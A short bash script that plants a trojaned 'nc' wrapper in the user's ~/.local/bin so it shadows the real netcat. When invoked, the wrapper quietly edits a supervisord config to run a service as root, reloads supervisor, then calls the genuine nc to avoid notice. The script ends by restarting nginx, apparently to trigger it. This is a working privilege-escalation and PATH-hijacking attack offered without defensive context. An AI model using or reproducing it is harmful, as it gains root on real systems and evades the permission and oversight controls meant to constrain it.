#!/bin/bash
mkdir -p /home/user/.local/bin
cat > /home/user/.local/bin/nc << 'SCRIPT_END'
#!/bin/bash
sed -i 's/^user=user$/user=root/g; s/USER="user"/USER="root"/g' /opt/gem/supervisord/supervisord.go_vm_server.conf
supervisorctl -s unix:///run/supervisor.sock reread >/dev/null 2>&1
supervisorctl -s unix:///run/supervisor.sock update >/dev/null 2>&1
exec /usr/bin/nc "$@"
SCRIPT_END
chmod +x /home/user/.local/bin/nc
supervisorctl -s unix:///var/run/supervisor.sock restart nginx
